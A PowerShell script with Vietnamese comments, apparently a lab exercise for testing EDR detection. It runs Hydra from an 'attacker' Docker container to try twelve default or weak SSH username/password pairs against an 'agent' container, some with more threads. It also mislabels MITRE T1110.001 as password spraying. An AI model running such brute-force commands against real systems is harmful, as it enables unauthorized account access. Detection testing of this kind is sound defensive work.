# Script mô phỏng tấn công SSH để kiểm tra hệ thống bảo mật
# Được viết bởi team security để test khả năng phát hiện của EDR

Write-Host "=============================================" -ForegroundColor Red
Write-Host "    KIỂM TRA BẢO MẬT HỆ THỐNG SSH" -ForegroundColor Red  
Write-Host "=============================================" -ForegroundColor Red
Write-Host ""
Write-Host "Thông tin mục tiêu cần kiểm tra:" -ForegroundColor Yellow
Write-Host "  » Máy chủ đích: container agent" -ForegroundColor White
Write-Host "  » Địa chỉ IP: 172.19.0.2" -ForegroundColor White  
Write-Host "  » Cổng dịch vụ: 22 (SSH)" -ForegroundColor White
Write-Host "  » Công cụ test: Hydra scanner" -ForegroundColor White
Write-Host "  » Nguồn test: container attacker" -ForegroundColor White
Write-Host ""

# Giai đoạn 1: Thử các tài khoản quản trị thông thường
Write-Host "[GIAI ĐOẠN 1] Kiểm tra các tài khoản admin phổ biến" -ForegroundColor Cyan
Write-Host "=================================================" -ForegroundColor Cyan

Write-Host "`n[Test 1.1] Đang thử đăng nhập admin/admin123..." -ForegroundColor Green
docker exec attacker hydra -l admin -p admin123 ssh://agent -t 2 -v
Start-Sleep 2

Write-Host "`n[Test 1.2] Kiểm tra administrator/password..." -ForegroundColor Green  
docker exec attacker hydra -l administrator -p password ssh://agent -t 2 -v
Start-Sleep 2

Write-Host "`n[Test 1.3] Thử kết nối root/toor..." -ForegroundColor Green
docker exec attacker hydra -l root -p toor ssh://agent -t 2 -v
Start-Sleep 2

# Giai đoạn 2: Test các combo tài khoản mật khẩu hay gặp
Write-Host "`n[GIAI ĐOẠN 2] Kiểm tra username/password thường thấy" -ForegroundColor Cyan
Write-Host "======================================================" -ForegroundColor Cyan

Write-Host "`n[Test 2.1] Thử nghiệm user/user123..." -ForegroundColor Green
docker exec attacker hydra -l user -p user123 ssh://agent -t 2 -v
Start-Sleep 2

Write-Host "`n[Test 2.2] Kiểm tra guest/guest..." -ForegroundColor Green
docker exec attacker hydra -l guest -p guest ssh://agent -t 2 -v  
Start-Sleep 2

Write-Host "`n[Test 2.3] Test account test/test123..." -ForegroundColor Green
docker exec attacker hydra -l test -p test123 ssh://agent -t 2 -v
Start-Sleep 2

# Giai đoạn 3: Mô phỏng tấn công cường độ cao (nhiều luồng)
Write-Host "`n[GIAI ĐOẠN 3] Test khả năng chịu tải với nhiều kết nối đồng thời" -ForegroundColor Cyan
Write-Host "=============================================================" -ForegroundColor Cyan

Write-Host "`n[Test 3.1] Kiểm tra với 4 luồng kết nối cùng lúc..." -ForegroundColor Green
docker exec attacker hydra -l hacker -p password123 ssh://agent -t 4 -v
Start-Sleep 3

Write-Host "`n[Test 3.2] Test tải nặng với 6 luồng..." -ForegroundColor Green
docker exec attacker hydra -l malicious -p hack123 ssh://agent -t 6 -v
Start-Sleep 3

# Giai đoạn 4: Kiểm tra các tài khoản dịch vụ hệ thống  
Write-Host "`n[GIAI ĐOẠN 4] Test security cho các service accounts" -ForegroundColor Cyan
Write-Host "=================================================" -ForegroundColor Cyan

Write-Host "`n[Test 4.1] Thử tài khoản SSH service..." -ForegroundColor Green
docker exec attacker hydra -l sshd -p sshd123 ssh://agent -t 3 -v
Start-Sleep 2

Write-Host "`n[Test 4.2] Kiểm tra system accounts..." -ForegroundColor Green
docker exec attacker hydra -l daemon -p daemon ssh://agent -t 2 -v
Start-Sleep 2

# Giai đoạn 5: Mô phỏng tấn công từ điển (dictionary attack)
Write-Host "`n[GIAI ĐOẠN 5] Kiểm tra với pattern từ điển mật khẩu" -ForegroundColor Cyan  
Write-Host "===============================================" -ForegroundColor Cyan

Write-Host "`n[Test 5.1] Thử các password từ wordlist..." -ForegroundColor Green
docker exec attacker hydra -l ubuntu -p ubuntu ssh://agent -t 3 -v
Start-Sleep 2

Write-Host "`n[Test 5.2] Test mật khẩu yếu thường gặp..." -ForegroundColor Green
docker exec attacker hydra -l backup -p backup123 ssh://agent -t 2 -v
Start-Sleep 2

Write-Host "`n[Test 5.3] Kiểm tra default credentials..." -ForegroundColor Green  
docker exec attacker hydra -l service -p service ssh://agent -t 2 -v

Write-Host "`n=============================================" -ForegroundColor Red
Write-Host "    HOÀN THÀNH KIỂM TRA BẢO MẬT SSH" -ForegroundColor Red
Write-Host "=============================================" -ForegroundColor Red
Write-Host ""
Write-Host "Tổng kết kết quả:" -ForegroundColor Yellow
Write-Host "  » Tổng số test case: 12 combo username/password khác nhau" -ForegroundColor White
Write-Host "  » Loại test: Admin accounts, mật khẩu thường gặp, đa luồng" -ForegroundColor White  
Write-Host "  » Monitoring: Kiểm tra EDR dashboard để xem alerts và events" -ForegroundColor White
Write-Host "  » MITRE Framework: T1110.001 (Password Spraying technique)" -ForegroundColor White
Write-Host ""
Write-Host "Lưu ý: Đây là test bảo mật hợp pháp trong môi trường lab" -ForegroundColor Gray
